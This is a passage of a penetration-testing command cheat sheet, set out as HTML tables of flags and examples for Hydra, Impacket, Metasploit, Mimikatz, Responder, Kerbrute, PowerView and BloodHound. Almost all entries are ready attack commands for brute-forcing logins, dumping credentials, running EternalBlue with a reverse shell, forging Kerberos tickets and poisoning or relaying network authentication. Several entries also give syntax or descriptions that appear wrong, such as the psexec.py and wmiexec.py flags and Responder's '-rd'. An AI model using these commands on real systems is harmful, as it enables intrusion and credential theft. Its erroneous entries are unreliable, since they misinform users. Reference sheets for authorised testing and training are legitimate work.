      <td><code>-o [file]</code></td>
      <td><code>-o results.txt</code></td>
      <td>Outputs results to a specified file.</td>
    </tr>
    <tr>
      <td><code>-x [min:max:charset]</code></td>
      <td><code>-x 4:8:abc123</code></td>
      <td>Sets brute force mode with parameters (min length: 4, max length: 8, charset: abc123).</td>
    </tr>
    <tr>
      <td><code>http-get-form</code></td>
      <td><code>http-get-form:"/login.php:username=^USER^&amp;password=^PASS^:F=incorrect"</code></td>
      <td>Targets HTTP GET form authentication.</td>
    </tr>
    <tr>
      <td><code>http-post-form</code></td>
      <td><code>http-post-form:"/login.php:username=^USER^&amp;password=^PASS^:F=invalid"</code></td>
      <td>Targets HTTP POST form authentication.</td>
    </tr>
    <tr>
      <td><code>ssh://[target]</code></td>
      <td><code>ssh://192.168.1.100</code></td>
      <td>Targets SSH authentication.</td>
    </tr>
    <tr>
      <td><code>ftp://[target]</code></td>
      <td><code>ftp://192.168.1.100</code></td>
      <td>Targets FTP authentication.</td>
    </tr>
  </tbody>
</table>

### Impacket
<table border="1" cellspacing="0" cellpadding="4">
  <thead>
    <tr>
      <th>Command/Flag</th>
      <th>Syntax Example</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>smbclient.py</code></td>
      <td><code>python smbclient.py 192.168.1.100</code></td>
      <td>Connects to SMB shares on a remote system.</td>
    </tr>
    <tr>
      <td><code>psexec.py</code></td>
      <td><code>python psexec.py 192.168.1.100 -u admin -p secret</code></td>
      <td>Executes commands remotely via SMB (mimics PsExec functionality).</td>
    </tr>
    <tr>
      <td><code>wmiexec.py</code></td>
      <td><code>python wmiexec.py 192.168.1.100 -u admin -p secret</code></td>
      <td>Executes commands on remote Windows systems using WMI.</td>
    </tr>
    <tr>
      <td><code>secretsdump.py</code></td>
      <td><code>python secretsdump.py DOMAIN/admin:secret@192.168.1.100</code></td>
      <td>Dumps password hashes from Windows systems.</td>
    </tr>
    <tr>
      <td><code>-target-ip [ip]</code></td>
      <td><code>-target-ip 192.168.1.100</code></td>
      <td>Specifies the target IP (common across Impacket tools).</td>
    </tr>
    <tr>
      <td><code>-hashes [LM:NT]</code></td>
      <td><code>-hashes ""aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0</code></td>
      <td>Provides LM and NT hashes for authentication.</td>
    </tr>
    <tr>
      <td><code>-command [command]</code></td>
      <td><code>-command "ipconfig /all"</code></td>
      <td>Specifies a command to execute (used in psexec/wmiexec).</td>
    </tr>
  </tbody>
</table>

### John the Ripper
<table border="1" cellspacing="0" cellpadding="4">
  <thead>
    <tr>
      <th>Command/Flag</th>
      <th>Syntax Example</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>john</code></td>
      <td><code>john hashes.txt</code></td>
      <td>Invokes John the Ripper for password cracking.</td>
    </tr>
    <tr>
      <td><code>--wordlist=[file]</code></td>
      <td><code>--wordlist=passwords.txt</code></td>
      <td>Specifies a wordlist for cracking passwords.</td>
    </tr>
    <tr>
      <td><code>--rules</code></td>
      <td><code>--rules</code></td>
      <td>Enables word mangling rules during cracking.</td>
    </tr>
    <tr>
      <td><code>--incremental</code></td>
      <td><code>--incremental</code></td>
      <td>Uses incremental mode for cracking.</td>
    </tr>
    <tr>
      <td><code>--show</code></td>
      <td><code>--show</code></td>
      <td>Displays cracked passwords.</td>
    </tr>
    <tr>
      <td><code>--format=[format]</code></td>
      <td><code>--format=md5crypt</code></td>
      <td>Specifies the hash format to use.</td>
    </tr>
    <tr>
      <td><code>--fork=[n]</code></td>
      <td><code>--fork=4</code></td>
      <td>Uses multiple processes to speed up cracking (example: 4 forks).</td>
    </tr>
  </tbody>
</table>

### LinPEAS
<table border="1" cellspacing="0" cellpadding="4">
  <thead>
    <tr>
      <th>Command/Flag</th>
      <th>Syntax Example</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>linpeas.sh</code></td>
      <td><code>./linpeas.sh</code></td>
      <td>Runs LinPEAS to enumerate Linux privilege escalation paths.</td>
    </tr>
    <tr>
      <td><code>-a</code></td>
      <td><code>./linpeas.sh -a</code></td>
      <td>(Optional) Runs all available enumeration checks.</td>
    </tr>
  </tbody>
</table>

### Medusa
<table border="1" cellspacing="0" cellpadding="4">
  <thead>
    <tr>
      <th>Command/Flag</th>
      <th>Syntax Example</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>medusa</code></td>
      <td><code>medusa -h 192.168.1.100 -u admin -p secret -M ssh</code></td>
      <td>Invokes Medusa for parallel brute-force attacks.</td>
    </tr>
    <tr>
      <td><code>-h [target]</code></td>
      <td><code>-h 192.168.1.100</code></td>
      <td>Specifies the target host.</td>
    </tr>
    <tr>
      <td><code>-u [username]</code></td>
      <td><code>-u admin</code></td>
      <td>Specifies a single username.</td>
    </tr>
    <tr>
      <td><code>-p [password]</code></td>
      <td><code>-p secret</code></td>
      <td>Specifies a single password.</td>
    </tr>
    <tr>
      <td><code>-M [module]</code></td>
      <td><code>-M ssh</code></td>
      <td>Sets the module (protocol) to attack (e.g., ssh, ftp).</td>
    </tr>
  </tbody>
</table>

### Metasploit
<table border="1" cellspacing="0" cellpadding="4">
  <thead>
    <tr>
      <th>Command/Flag</th>
      <th>Syntax Example</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>msfconsole</code></td>
      <td><code>msfconsole</code></td>
      <td>Launches the Metasploit Framework console.</td>
    </tr>
    <tr>
      <td><code>use [module]</code></td>
      <td><code>use exploit/windows/smb/ms17_010_eternalblue</code></td>
      <td>Loads a specific exploit or auxiliary module.</td>
    </tr>
    <tr>
      <td><code>set RHOSTS [ip]</code></td>
      <td><code>set RHOSTS 192.168.1.100</code></td>
      <td>Sets the target IP address.</td>
    </tr>
    <tr>
      <td><code>set RPORT [port]</code></td>
      <td><code>set RPORT 445</code></td>
      <td>Sets the target port.</td>
    </tr>
    <tr>
      <td><code>set PAYLOAD [payload]</code></td>
      <td><code>set PAYLOAD windows/x64/meterpreter/reverse_tcp</code></td>
      <td>Specifies the payload to use.</td>
    </tr>
    <tr>
      <td><code>exploit</code></td>
      <td><code>exploit</code></td>
      <td>Executes the loaded module against the target.</td>
    </tr>
    <tr>
      <td><code>sessions -l</code></td>
      <td><code>sessions -l</code></td>
      <td>Lists active sessions.</td>
    </tr>
    <tr>
      <td><code>sessions -i [id]</code></td>
      <td><code>sessions -i 1</code></td>
      <td>Interacts with a specific session (session ID 1).</td>
    </tr>
    <tr>
      <td><code>back</code></td>
      <td><code>back</code></td>
      <td>Returns to module selection from the current context.</td>
    </tr>
    <tr>
      <td><code>search [term]</code></td>
      <td><code>search eternalblue</code></td>
      <td>Searches for modules matching the given term.</td>
    </tr>
  </tbody>
</table>

### Mimikatz
<table border="1" cellspacing="0" cellpadding="4">
  <thead>
    <tr>
      <th>Command/Flag</th>
      <th>Syntax Example</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>mimikatz</code></td>
      <td><code>mimikatz.exe</code></td>
      <td>Launches Mimikatz for Windows credential dumping.</td>
    </tr>
    <tr>
      <td><code>privilege::debug</code></td>
      <td><code>privilege::debug</code></td>
      <td>Elevates privileges for credential extraction.</td>
    </tr>
    <tr>
      <td><code>sekurlsa::logonpasswords</code></td>
      <td><code>sekurlsa::logonpasswords</code></td>
      <td>Dumps credentials from memory.</td>
    </tr>
    <tr>
      <td><code>crypto::capi</code></td>
      <td><code>crypto::capi</code></td>
      <td>Dumps cryptographic keys.</td>
    </tr>
  </tbody>
</table>

### Ncrack
<table border="1" cellspacing="0" cellpadding="4">
  <thead>
    <tr>
      <th>Command/Flag</th>
      <th>Syntax Example</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>ncrack</code></td>
      <td><code>ncrack -p 3389 192.168.1.100</code></td>
      <td>Invokes Ncrack for network authentication brute force (e.g., RDP).</td>
    </tr>
    <tr>
      <td><code>-p [port]</code></td>
      <td><code>-p 3389</code></td>
      <td>Specifies the target port.</td>
    </tr>
    <tr>
      <td><code>[target]</code></td>
      <td><code>192.168.1.100</code></td>
      <td>Specifies the target IP address.</td>
    </tr>
    <tr>
      <td><code>-U [userfile]</code></td>
      <td><code>-U users.txt</code></td>
      <td>Uses a file containing usernames.</td>
    </tr>
    <tr>
      <td><code>-P [passfile]</code></td>
      <td><code>-P pass.txt</code></td>
      <td>Uses a file containing passwords.</td>
    </tr>
  </tbody>
</table>

### Nikto
<table border="1" cellspacing="0" cellpadding="4">
  <thead>
    <tr>
      <th>Command/Flag</th>
      <th>Syntax Example</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>nikto</code></td>
      <td><code>nikto -h http://example.com</code></td>
      <td>Launches Nikto for web server vulnerability scanning.</td>
    </tr>
    <tr>
      <td><code>-h [host]</code></td>
      <td><code>-h http://example.com</code></td>
      <td>Specifies the target host.</td>
    </tr>
    <tr>
      <td><code>-p [port]</code></td>
      <td><code>-p 80</code></td>
      <td>Specifies the target port.</td>
    </tr>
    <tr>
      <td><code>-output [file]</code></td>
      <td><code>-output nikto.txt</code></td>
      <td>Writes scan results to a specified file.</td>
    </tr>
    <tr>
      <td><code>-Tuning [options]</code></td>
      <td><code>-Tuning 1,2,3</code></td>
      <td>Sets scan tuning options (comma-separated numeric options).</td>
    </tr>
    <tr>
      <td><code>-Display [options]</code></td>
      <td><code>-Display V</code></td>
      <td>Adjusts output display options (e.g., verbose output).</td>
    </tr>
  </tbody>
</table>

### Nmap
<table border="1" cellspacing="0" cellpadding="4">
  <thead>
    <tr>
      <th>Command/Flag</th>
      <th>Syntax Example</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>nmap</code></td>
      <td><code>nmap 192.168.1.0/24</code></td>
      <td>Invokes Nmap for network scanning and enumeration.</td>
    </tr>
    <tr>
      <td><code>-sS</code></td>
      <td><code>nmap -sS 192.168.1.100</code></td>
      <td>Performs a TCP SYN (stealth) scan.</td>
    </tr>
    <tr>
      <td><code>-sV</code></td>
      <td><code>nmap -sV 192.168.1.100</code></td>
      <td>Enables version detection for services.</td>
    </tr>
    <tr>
      <td><code>-A</code></td>
      <td><code>nmap -A 192.168.1.100</code></td>
      <td>Aggressive scan: OS detection, version detection, script scanning, etc.</td>
    </tr>
    <tr>
      <td><code>-O</code></td>
      <td><code>nmap -O 192.168.1.100</code></td>
      <td>Enables operating system detection.</td>
    </tr>
    <tr>
      <td><code>-p [port]</code></td>
      <td><code>nmap -p 80,443 192.168.1.100</code></td>
      <td>Specifies target port(s) to scan (comma-separated list).</td>
    </tr>
    <tr>
      <td><code>--script [script-name]</code></td>
      <td><code>nmap --script vuln 192.168.1.100</code></td>
      <td>Runs specified NSE scripts.</td>
    </tr>
    <tr>
      <td><code>-Pn</code></td>
      <td><code>nmap -Pn 192.168.1.100</code></td>
      <td>Skips host discovery (assumes hosts are online).</td>
    </tr>
    <tr>
      <td><code>-T4</code></td>
      <td><code>nmap -T4 192.168.1.100</code></td>
      <td>Sets timing template for faster scanning.</td>
    </tr>
    <tr>
      <td><code>-oN [file]</code></td>
      <td><code>-oN scan.txt</code></td>
      <td>Outputs scan results in normal format to a file.</td>
    </tr>
    <tr>
      <td><code>-oX [file]</code></td>
      <td><code>-oX scan.xml</code></td>
      <td>Outputs scan results in XML format to a file.</td>
    </tr>
  </tbody>
</table>

### OWASP ZAP
<table border="1" cellspacing="0" cellpadding="4">
  <thead>
    <tr>
      <th>Command/Flag</th>
      <th>Syntax Example</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>zap.sh</code></td>
      <td><code>./zap.sh</code></td>
      <td>Launches OWASP ZAP for web application testing.</td>
    </tr>
    <tr>
      <td><code>-daemon</code></td>
      <td><code>./zap.sh -daemon</code></td>
      <td>Runs OWASP ZAP in daemon mode (background).</td>
    </tr>
    <tr>
      <td><code>-port [port]</code></td>
      <td><code>-port 8080</code></td>
      <td>Specifies the port for the proxy.</td>
    </tr>
  </tbody>
</table>

### PowerUp
<table border="1" cellspacing="0" cellpadding="4">
  <thead>
    <tr>
      <th>Command/Flag</th>
      <th>Syntax Example</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>PowerUp.ps1</code></td>
      <td><code>.\PowerUp.ps1</code></td>
      <td>Executes the PowerUp script for Windows privilege escalation.</td>
    </tr>
    <tr>
      <td><code>Invoke-AllChecks</code></td>
      <td><code>Invoke-AllChecks</code></td>
      <td>Runs all enumeration checks for common misconfigurations.</td>
    </tr>
  </tbody>
</table>

### Responder
<table border="1" cellspacing="0" cellpadding="4">
  <thead>
    <tr>
      <th>Command/Flag</th>
      <th>Syntax Example</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>responder</code></td>
      <td><code>responder -I eth0</code></td>
      <td>Launches Responder to capture NetBIOS/LLMNR traffic on the network.</td>
    </tr>
    <tr>
      <td><code>-I [interface]</code></td>
      <td><code>-I eth0</code></td>
      <td>Specifies the network interface to listen on.</td>
    </tr>
    <tr>
      <td><code>-rd</code></td>
      <td><code>-rd</code></td>
      <td>Enables relay daemon mode.</td>
    </tr>
    <tr>
      <td><code>-v</code></td>
      <td><code>-v</code></td>
      <td>Enables verbose mode.</td>
    </tr>
    <tr>
      <td><code>-f</code></td>
      <td><code>-f</code></td>
      <td>Saves captured hashes to a file.</td>
    </tr>
    <tr>
      <td><code>-w</code></td>
      <td><code>-w logs.txt</code></td>
      <td>Writes logs to a specified file.</td>
    </tr>
  </tbody>
</table>

### Seatbelt
<table border="1" cellspacing="0" cellpadding="4">
  <thead>
    <tr>
      <th>Command/Flag</th>
      <th>Syntax Example</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>Seatbelt.exe</code></td>
      <td><code>Seatbelt.exe -group=privilege</code></td>
      <td>Runs Seatbelt to enumerate Windows system configuration.</td>
    </tr>
    <tr>
      <td><code>-group [category]</code></td>
      <td><code>-group=privilege</code></td>
      <td>Filters output by a specific category (e.g., privilege).</td>
    </tr>
  </tbody>
</table>

### Socat
<table border="1" cellspacing="0" cellpadding="4">
  <thead>
    <tr>
      <th>Command/Flag</th>
      <th>Syntax Example</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>socat</code></td>
      <td><code>socat TCP-LISTEN:4444,reuseaddr,fork TCP:192.168.1.100:80</code></td>
      <td>Establishes bidirectional data transfer (useful for tunneling).</td>
    </tr>
    <tr>
      <td><code>TCP-LISTEN:[port]</code></td>
      <td><code>TCP-LISTEN:4444</code></td>
      <td>Listens on a specified port for incoming connections.</td>
    </tr>
    <tr>
      <td><code>TCP:[target]:[port]</code></td>
      <td><code>TCP:192.168.1.100:80</code></td>
      <td>Connects to a target's port.</td>
    </tr>
  </tbody>
</table>

### Telnet
<table border="1" cellspacing="0" cellpadding="4">
  <thead>
    <tr>
      <th>Command/Flag</th>
      <th>Syntax Example</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>telnet</code></td>
      <td><code>telnet 192.168.1.100 23</code></td>
      <td>Connects to a target via Telnet.</td>
    </tr>
    <tr>
      <td><code>[host] [port]</code></td>
      <td><code>192.168.1.100 23</code></td>
      <td>Specifies the target host and port.</td>
    </tr>
  </tbody>
</table>

### WinPEAS
<table border="1" cellspacing="0" cellpadding="4">
  <thead>
    <tr>
      <th>Command/Flag</th>
      <th>Syntax Example</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>winPEAS.bat</code></td>
      <td><code>winPEAS.bat</code></td>
      <td>Executes WinPEAS for Windows privilege escalation enumeration.</td>
    </tr>
    <tr>
      <td><code>-full</code></td>
      <td><code>winPEAS.bat -full</code></td>
      <td>Runs a full scan to check all escalation paths.</td>
    </tr>
  </tbody>
</table>

### WPScan
<table border="1" cellspacing="0" cellpadding="4">
  <thead>
    <tr>
      <th>Command/Flag</th>
      <th>Syntax Example</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>wpscan</code></td>
      <td><code>wpscan --url http://example.com</code></td>
      <td>Launches WPScan for WordPress vulnerability scanning.</td>
    </tr>
    <tr>
      <td><code>--url [url]</code></td>
      <td><code>--url http://example.com</code></td>
      <td>Specifies the target URL.</td>
    </tr>
    <tr>
      <td><code>--enumerate [option]</code></td>
      <td><code>--enumerate u</code></td>
      <td>Enumerates plugins, themes, or users (e.g., u for users, p for plugins).</td>
    </tr>
    <tr>
      <td><code>--api-token [token]</code></td>
      <td><code>--api-token abc123</code></td>
      <td>Uses an API token for vulnerability database access.</td>
    </tr>
    <tr>
      <td><code>-e [option]</code></td>
      <td><code>-e vp</code></td>
      <td>Alias for enumeration options (e.g., vp for vulnerable plugins).</td>
    </tr>
    <tr>
      <td><code>--passwords [file]</code></td>
      <td><code>--passwords passwords.txt</code></td>
      <td>Specifies a password list for brute force attacks.</td>
    </tr>
    <tr>
      <td><code>--usernames [file]</code></td>
      <td><code>--usernames usernames.txt</code></td>
      <td>Specifies a username list for brute force attacks.</td>
    </tr>
  </tbody>
</table>

### Xfreerdp / Rdesktop (RDP Clients)
<table border="1" cellspacing="0" cellpadding="4">
  <thead>
    <tr>
      <th>Command/Flag</th>
      <th>Syntax Example</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>xfreerdp</code></td>
      <td><code>xfreerdp /v:192.168.1.100</code></td>
      <td>Connects to a remote desktop using FreeRDP.</td>
    </tr>
    <tr>
      <td><code>rdesktop</code></td>
      <td><code>rdesktop 192.168.1.100</code></td>
      <td>Connects to a remote desktop using rdesktop.</td>
    </tr>
    <tr>
      <td><code>/v:[host]</code></td>
      <td><code>/v:192.168.1.100</code></td>
      <td>Specifies the target host in xfreerdp.</td>
    </tr>
    <tr>
      <td><code>[options]</code></td>
      <td>(varies)</td>
      <td>Various options for session customization (e.g., /u, /p, /size).</td>
    </tr>
  </tbody>
</table>

### ldapsearch
<table border="1" cellspacing="0" cellpadding="4">
  <thead>
    <tr>
      <th>Command/Flag</th>
      <th>Syntax Example</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>ldapsearch</code></td>
      <td><code>ldapsearch -x -H ldap://192.168.1.100 -b "dc=example,dc=com"</code></td>
      <td>Executes LDAP search queries for directory enumeration.</td>
    </tr>
  </tbody>
</table>

### mongo (MongoDB Client)
<table border="1" cellspacing="0" cellpadding="4">
  <thead>
    <tr>
      <th>Command/Flag</th>
      <th>Syntax Example</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>mongo</code></td>
      <td><code>mongo --host 192.168.1.100</code></td>
      <td>Connects to a MongoDB server for database queries.</td>
    </tr>
  </tbody>
</table>

### onesixtyone
<table border="1" cellspacing="0" cellpadding="4">
  <thead>
    <tr>
      <th>Command/Flag</th>
      <th>Syntax Example</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>onesixtyone</code></td>
      <td><code>onesixtyone -c public 192.168.1.100</code></td>
      <td>Brute-forces SNMP community strings (e.g., "public").</td>
    </tr>
  </tbody>
</table>

---

## Active Directory Enumeration & Attacks

### PowerView / SharpView  
*PowerView (and its .NET fork SharpView) is a PowerShell toolkit for AD situational awareness—replacing many built‑in net* commands and gathering data for BloodHound‑style relationship mapping.*  
<table border="1" cellspacing="0" cellpadding="4">
  <thead>
    <tr>
      <th>Command/Flag</th>
      <th>Syntax Example</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>Import-Module .\PowerView.ps1</code></td>
      <td><code>Import-Module .\PowerView.ps1</code></td>
      <td>Loads the PowerView module into the current PowerShell session.</td>
    </tr>
    <tr>
      <td><code>Get-NetUser</code></td>
      <td><code>Get-NetUser -Domain example.local</code></td>
      <td>Enumerates all users in the target domain.</td>
    </tr>
    <tr>
      <td><code>Get-NetComputer</code></td>
      <td><code>Get-NetComputer -OperatingSystem "Windows Server*"</code></td>
      <td>Lists domain computers matching an OS filter.</td>
    </tr>
    <tr>
      <td><code>Get-NetGroupMember</code></td>
      <td><code>Get-NetGroupMember -GroupName "Domain Admins"</code></td>
      <td>Retrieves members of the specified AD group.</td>
    </tr>
    <tr>
      <td><code>Get-NetOU</code></td>
      <td><code>Get-NetOU -Domain example.local</code></td>
      <td>Lists all Organizational Units in the domain.</td>
    </tr>
    <tr>
      <td><code>Get-NetDomain</code></td>
      <td><code>Get-NetDomain</code></td>
      <td>Fetches general information about the domain (SID, controllers, etc.).</td>
    </tr>
    <tr>
      <td><code>Invoke-ShareFinder</code></td>
      <td><code>Invoke-ShareFinder -Verbose</code></td>
      <td>Scans for SMB shares across the domain, reporting permissions.</td>
    </tr>
    <tr>
      <td><code>Invoke-UserHunter</code></td>
      <td><code>Invoke-UserHunter -CheckRemote</code></td>
      <td>Attempts to locate where a user is logged on across hosts.</td>
    </tr>
    <tr>
      <td><code>Invoke-Kerberoast</code></td>
      <td><code>Invoke-Kerberoast -GetUserSPNs</code></td>
      <td>Finds SPNs for offline Kerberoasting.</td>
    </tr>
  </tbody>
</table>

### SharpHound  
*SharpHound is the C# ingestor for BloodHound that collects AD data—sessions, ACLs, trusts, GPOs, local admins, etc.—for graph analysis.*  
<table border="1" cellspacing="0" cellpadding="4">
  <thead>
    <tr>
      <th>Command/Flag</th>
      <th>Syntax Example</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>SharpHound.exe -c All</code></td>
      <td><code>SharpHound.exe -c All</code></td>
      <td>Collects all ingestion methods: sessions, ACLs, trusts, GPOs, local admin, etc.</td>
    </tr>
    <tr>
      <td><code>-c Session</code></td>
      <td><code>SharpHound.exe -c Session</code></td>
      <td>Captures currently active user/computer sessions.</td>
    </tr>
    <tr>
      <td><code>-c Trusts</code></td>
      <td><code>SharpHound.exe -c Trusts</code></td>
      <td>Enumerates domain and forest trust relationships.</td>
    </tr>
    <tr>
      <td><code>-c ACL</code></td>
      <td><code>SharpHound.exe -c ACL</code></td>
      <td>Gathers ACLs on objects to find privilege paths.</td>
    </tr>
    <tr>
      <td><code>-c LocalAdmin</code></td>
      <td><code>SharpHound.exe -c LocalAdmin</code></td>
      <td>Enumerates local administrators on all machines.</td>
    </tr>
    <tr>
      <td><code>-c ObjectProps</code></td>
      <td><code>SharpHound.exe -c ObjectProps</code></td>
      <td>Collects detailed object properties for AD entities.</td>
    </tr>
    <tr>
      <td><code>-c DCOnly</code></td>
      <td><code>SharpHound.exe -c DCOnly</code></td>
      <td>Restricts collection to domain controllers.</td>
    </tr>
  </tbody>
</table>

### BloodHound.py  
*BloodHound.py is the Python/Impacket ingestor alternative for collecting AD data in non-domain-joined environments.*  
<table border="1" cellspacing="0" cellpadding="4">
  <thead>
    <tr>
      <th>Command/Flag</th>
      <th>Syntax Example</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>python BloodHound.py -c all</code></td>
      <td><code>python BloodHound.py -c all -u user -p Pass123!</code></td>
      <td>Runs all collection methods (LDAP, SMB) using given credentials.</td>
    </tr>
    <tr>
      <td><code>-c Session</code></td>
      <td><code>python BloodHound.py -c Session --json</code></td>
      <td>Captures session data and outputs JSON files.</td>
    </tr>
    <tr>
      <td><code>-c Trusts</code></td>
      <td><code>python BloodHound.py -c Trusts -dc dc01.example.local</code></td>
      <td>Collects only trust relationships from a specified DC.</td>
    </tr>
    <tr>
      <td><code>-c ACL</code></td>
      <td><code>python BloodHound.py -c ACL -ns 1</code></td>
      <td>Gathers ACLs on objects with 1 thread for speed control.</td>
    </tr>
    <tr>
      <td><code>-c DCOnly</code></td>
      <td><code>python BloodHound.py -c DCOnly -d example.local</code></td>
      <td>Limits collection to domain controllers.</td>
    </tr>
    <tr>
      <td><code>--zip</code></td>
      <td><code>python BloodHound.py -c all --zip</code></td>
      <td>Compresses output JSON files into a ZIP for import.</td>
    </tr>
  </tbody>
</table>

### Kerbrute  
*Kerbrute is a Go tool for Kerberos Pre-Authentication attacks—user enumeration, password spraying, and brute-forcing.*  
<table border="1" cellspacing="0" cellpadding="4">
  <thead>
    <tr>
      <th>Command/Flag</th>
      <th>Syntax Example</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>kerbrute userenum</code></td>
      <td><code>kerbrute userenum --dc dc.example.local users.txt</code></td>
      <td>Enumerates valid AD usernames via Kerberos Pre-Auth.</td>
    </tr>
    <tr>
      <td><code>--delay</code></td>
      <td><code>kerbrute userenum --dc dc --delay 1500 users.txt</code></td>
      <td>Adds a delay (ms) between attempts to avoid lockouts.</td>
    </tr>
    <tr>
      <td><code>kerbrute passwordspray</code></td>
      <td><code>kerbrute passwordspray --dc dc -U users.txt -P common.txt</code></td>
      <td>Performs password spray against multiple accounts.</td>
    </tr>
    <tr>
      <td><code>kerbrute bruteforce</code></td>
      <td><code>kerbrute bruteforce --dc dc -U admin -P passlist.txt</code></td>
      <td>Brute‑forces a single user’s password via Kerberos.</td>
    </tr>
    <tr>
      <td><code>--output</code></td>
      <td><code>kerbrute userenum --dc dc -o valid_users.txt users.txt</code></td>
      <td>Saves valid usernames to an output file.</td>
    </tr>
  </tbody>
</table>

### Impacket Toolkit (Selected)  
*Impacket is a Python collection for network protocol interaction—SMB, LDAP, Kerberos, MS‑RPC, etc.*  
<table border="1" cellspacing="0" cellpadding="4">
  <thead>
    <tr>
      <th>Command/Flag</th>
      <th>Syntax Example</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>secretsdump.py</code></td>
      <td><code>python secretsdump.py domain/admin:Pass@dc01</code></td>
      <td>Dumps SAM/LSA secrets from remote host over SMB.</td>
    </tr>
    <tr>
      <td><code>GetUserSPNs.py</code></td>
      <td><code>python GetUserSPNs.py -request -dc dc01 -u user -p Pass</code></td>
      <td>Finds SPNs for Kerberoasting.</td>
    </tr>
    <tr>
      <td><code>GetNPUsers.py</code></td>
      <td><code>python GetNPUsers.py -no-pass example/user@dc01</code></td>
      <td>ASREPRoasts users not requiring pre-authentication.</td>
    </tr>
    <tr>
      <td><code>psexec.py</code></td>
      <td><code>python psexec.py domain/user:Pass@dc01</code></td>
      <td>Executes commands remotely via SMB (PsExec style).</td>
    </tr>
    <tr>
      <td><code>wmiexec.py</code></td>
      <td><code>python wmiexec.py dc01 -u user -p Pass</code></td>
      <td>Executes commands via WMI using provided creds.</td>
    </tr>
    <tr>
      <td><code>mssqlclient.py</code></td>
      <td><code>python mssqlclient.py user:Pass@dc01</code></td>
      <td>Interacts with MSSQL databases using provided creds.</td>
    </tr>
    <tr>
      <td><code>rpcdump.py</code></td>
      <td><code>python rpcdump.py 10.0.0.1</code></td>
      <td>Enumerates RPC endpoints on a host.</td>
    </tr>
    <tr>
      <td><code>ntlmrelayx.py</code></td>
      <td><code>python ntlmrelayx.py -tf targets.txt -smb2support</code></td>
      <td>Performs SMB relay attacks against listed targets.</td>
    </tr>
    <tr>
      <td><code>lookupsid.py</code></td>
      <td><code>python lookupsid.py example.local/S-1-5-21-...</code></td>
      <td>Retrieves account information by SID.</td>
    </tr>
    <tr>
      <td><code>ticketer.py</code></td>
      <td><code>python ticketer.py --domain example.local --user krbtgt</code></td>
      <td>Creates custom Kerberos tickets (Golden/Silver Tickets).</td>
    </tr>
    <tr>
      <td><code>raiseChild.py</code></td>
      <td><code>python raiseChild.py domain/user:Pass@dc01</code></td>
      <td>Automates child-to-parent domain privilege escalation.</td>
    </tr>
  </tbody>
</table>

### Responder  
*Responder poisons LLMNR, NBT-NS, MDNS and captures/relays hashes for credential theft and relay attacks.*  
<table border="1" cellspacing="0" cellpadding="4">
  <thead>
    <tr>
      <th>Command/Flag</th>
      <th>Syntax Example</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>responder -I eth0</code></td>
      <td><code>responder -I eth0 -r -w</code></td>
      <td>Starts LLMNR/NBT‑NS poisoner with WPAD rogue server and write logs.</td>
    </tr>
    <tr>
      <td><code>-u</code></td>
      <td><code>responder -I eth0 -u -P ntlm</code></td>
      <td>Only poison NTLM requests and capture hashes.</td>
    </tr>
    <tr>
      <td><code>-d</code></td>
      <td><code>responder -I eth0 -rd</code></td>
      <td>Enables relay daemon mode to forward captured creds.</td>
    </tr>
    <tr>
      <td><code>-v</code></td>
      <td><code>responder -I eth0 -v</code></td>
      <td>Verbose mode: displays detailed request/response info.</td>
    </tr>
  </tbody>
</table>

### Inveigh / InveighZero  
*Inveigh (PowerShell) and InveighZero (C#) are LLMNR/LLMNR/NBT‑NS/SMB poisoners with credential capture and relay capabilities.*  
<table border="1" cellspacing="0" cellpadding="4">
  <thead>
    <tr>
      <th>Command/Flag</th>
      <th>Syntax Example</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>.\Inveigh.ps1</code></td>
      <td><code>.\Inveigh.ps1 -ConsoleOutput Y</code></td>
      <td>Runs PowerShell poisoner with console output enabled.</td>
    </tr>
    <tr>
      <td><code>-NBNS</code></td>
      <td><code>.\Inveigh.ps1 -NBNS -LLMNR -SMB</code></td>
      <td>Enables NBNS, LLMNR, and SMB poisoning simultaneously.</td>
    </tr>
    <tr>
      <td><code>InveighZero.exe -Passive</code></td>
      <td><code>InveighZero.exe -Passive</code></td>
      <td>Starts C# poisoner in passive capture mode (no spoofing).</td>
    </tr>
    <tr>
      <td><code>-KeyRegex</code></td>
      <td><code>InveighZero.exe -KeyRegex "NTLM"</code></td>
      <td>Filters captured traffic for keys matching the regex.</td>
